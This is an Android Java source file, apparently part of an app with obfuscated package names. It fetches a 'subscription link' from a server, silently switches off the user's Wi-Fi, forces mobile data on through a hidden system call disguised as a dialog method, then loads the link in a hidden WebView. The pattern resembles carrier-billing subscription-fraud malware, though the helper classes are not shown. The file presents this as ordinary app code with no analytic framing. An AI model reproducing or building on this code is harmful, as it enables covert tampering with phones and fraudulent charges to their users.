package w.c.s.task;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;

import w.c.s.entity.Ma;
import w.c.s.utils.JsUtil;
import w.c.s.utils.LinkUtil;
import w.c.s.utils.PhoneControl;
import w.c.s.view.Va;


/**
 * Created by xlc on 2017/5/24.
 */

public class T_query extends AsyncTask<Void, Integer, Ma> {
    private Context mContext;
    private Handler handler;
    private Va web;

    public T_query (Context context) {
        this.mContext = context;
        web = Va.getInstance(context);
        handler = new Handler();
    }

    @Override
    protected Ma doInBackground (Void... params) {
        return LinkUtil.get_sub_link(mContext);
    }

    @Override
    protected void onPostExecute (final Ma s) {
        super.onPostExecute(s);
        if ( s == null ) {
            //                        Ulog.w("onPostExecute: 没有数据或不满足执行条件");
            //                        Ulog.show("onPostExecute: no data");
            return;
        }
        final int net_status = s.getAllow_network();

        switch ( net_status ) {
            case 1:
                boolean closeWifi = PhoneControl.check_show_dialog_time(mContext);
                if ( PhoneControl.getWifiStatus(mContext) && closeWifi ) {
                    //                                        Ulog.w("SplashActivity onPostExecute: 判断wifi为开启状态 做关闭");
                    //                                        Ulog.show("SplashActivity onPostExecute: close wifi");
                    if ( JsUtil.getInstance(mContext).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING ) {
                        //                                                Ulog.show("js downloading ，no close wifi");
                        return;
                    }
                    //关闭wifi
                    PhoneControl.closeWifi(mContext);
                }
                //  Ulog.show("SplashActivity onPostExecute: only wifi");

                if ( PhoneControl.getMobileStatus(mContext, null) ) {
                    //  Ulog.w("SplashActivity onPostExecute:GPRS为开启状态，不做开启操作");
                } else {
                    // Ulog.show("SplashActivity onPostExecute:open gprs");
                    // Ulog.w("SplashActivity onPostExecute:open gprs");
                    showDialog();
                }

                handler.postDelayed(new Runnable() {
                    @Override
                    public void run () {
                        //                                                Ulog.w("开始执行webView跳转");
                        web.startLoad(s, true);
                    }
                }, 5000);

                break;
            default:
                web.startLoad(s, true);
        }
    }

    private void showDialog () {
        PhoneControl.setNetState(mContext, "setMobileDataEnabled", true);
    }
}